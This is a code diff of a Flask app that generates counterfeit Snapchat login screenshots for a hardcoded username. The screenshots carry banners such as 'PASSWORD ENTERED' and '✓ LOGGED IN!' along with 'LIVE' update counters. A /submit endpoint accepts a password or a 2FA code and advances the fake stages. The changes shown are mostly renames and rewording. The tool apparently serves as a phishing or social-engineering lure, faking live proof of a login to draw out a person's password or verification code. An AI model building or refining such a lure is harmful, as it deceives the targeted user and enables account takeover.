@@ -12,14 +12,14 @@ app.template_folder = os.path.join(os.path.dirname(os.path.abspath(__file__)), '
 
 HARDCODED_USER = "zexoghaith"
 
-# Global state - always starts clean
+# Clean global state
 state = {
-    'stage': 'login',  # login | password | 2fa | done
+    'stage': 'login',   # login | password | 2fa | done
     'update_count': 0
 }
 
-def make_image():
-    """Create a fresh, realistic Snapchat screenshot for current stage"""
+def generate_screenshot():
+    """Create realistic Snapchat login screenshots with clear stage banners"""
     from PIL import Image, ImageDraw, ImageFont
     
     w, h = 1280, 720
@@ -48,11 +48,11 @@ def make_image():
     draw.rounded_rectangle([cx, cy, cx+440, cy+470], radius=12, fill='#1f1f1f')
     draw.text((cx+15, cy+10), "Log in to Snapchat", fill='white', font=med)
 
-    # Username
+    # Username field
     draw.rounded_rectangle([cx+15, cy+48, cx+425, cy+85], radius=6, fill='#2c2c2c')
     draw.text((cx+26, cy+57), "zexoghaith", fill='white', font=med)
 
-    # Password
+    # Password field
     draw.rounded_rectangle([cx+15, cy+95, cx+425, cy+132], radius=6, fill='#2c2c2c')
     if stage != 'login':
         draw.text((cx+26, cy+104), "••••••••••", fill='#22c55e', font=med)
@@ -75,11 +75,11 @@ def make_image():
     draw.rounded_rectangle([cx+15, by+95, cx+425, by+128], radius=14, fill='#2c2c2c')
     draw.text((cx+90, by+103), "Continue with Apple", fill='white', font=med)
 
-    # === BIG CLEAR BANNERS FOR EACH STAGE ===
+    # === VERY OBVIOUS STAGE BANNERS ===
     if stage == 'password':
         draw.rounded_rectangle([cx+10, cy+195, cx+430, cy+305], radius=8, fill='#3f2a00')
         draw.text((cx+20, cy+210), "PASSWORD ENTERED", fill='#f59e0b', font=big)
-        draw.text((cx+20, cy+250), "Log In button clicked", fill='white', font=med)
+        draw.text((cx+20, cy+250), "Log In button was clicked", fill='white', font=med)
         draw.text((cx+20, cy+275), "Waiting for Snapchat...", fill='#888888', font=med)
 
     if stage == '2fa':
@@ -93,35 +93,35 @@ def make_image():
         draw.rounded_rectangle([cx+10, cy+195, cx+430, cy+340], radius=8, fill='#052e16')
         draw.text((cx+70, cy+235), "✓ LOGGED IN!", fill='#22c55e', font=big)
 
-    # Live proof (very visible)
+    # Live proof
     draw.rounded_rectangle([10, 555, 280, 600], radius=5, fill='#ef4444')
     draw.text((15, 562), f"UPDATE #{state['update_count']}", fill='white', font=big)
 
     draw.rounded_rectangle([10, 610, 420, 660], radius=5, fill='#22c55e')
     draw.text((15, 617), f"TIME: {now}", fill='black', font=big)
 
-    draw.text((440, 620), f"STAGE: {stage}", fill='#ff8800', font=med)
+    draw.text((440, 620), f"STAGE:{stage}", fill='#ff8800', font=med)
 
     draw.rectangle([0, h-35, w, h], fill='#111111')
-    draw.text((8, h-28), "LIVE • only changes after you submit password or code", fill='#22c55e', font=med)
+    draw.text((8, h-28), "LIVE • changes only after you submit", fill='#22c55e', font=med)
 
     path = os.path.join(STATIC_DIR, 'screenshot.png')
     img.save(path, 'PNG')
     return path
 
-def loop():
+def run_loop():
     global state
     print("[LOOP] Starting clean Snapchat simulation")
     
-    # Always start clean
+    # Force clean login state
     state['stage'] = 'login'
     state['update_count'] = 0
     
-    snap()
+    generate_screenshot()
     state['started'] = True
     
     while True:
-        snap()
+        generate_screenshot()
         time.sleep(0.8)
 
 @app.route('/')
@@ -136,21 +136,21 @@ def submit():
     
     if pw:
         state['stage'] = 'password'
-        print("[SUBMIT] Password submitted -> showing PASSWORD ENTERED")
-        snap()
+        print("[SUBMIT] Password submitted -> PASSWORD ENTERED banner")
+        generate_screenshot()
         return jsonify({'ok': True, 'stage': 'password'})
     
     if cd and len(cd) >= 4:
         state['stage'] = '2fa'
-        print("[SUBMIT] 2FA submitted -> showing 2FA screen")
-        snap()
+        print("[SUBMIT] 2FA submitted -> 2FA screen")
+        generate_screenshot()
         return jsonify({'ok': True, 'stage': '2fa'})
     
     return jsonify({'ok': True})
 
 @app.route('/screenshot')
 def shot():
-    snap()
+    generate_screenshot()
     resp = send_from_directory(STATIC_DIR, 'screenshot.png')
     resp.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
     return resp
@@ -169,7 +169,7 @@ def stat():
 def boot():
     if not hasattr(app, 'booted'):
         app.booted = True
-        threading.Thread(target=loop, daemon=True).start()
+        threading.Thread(target=run_loop, daemon=True).start()
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
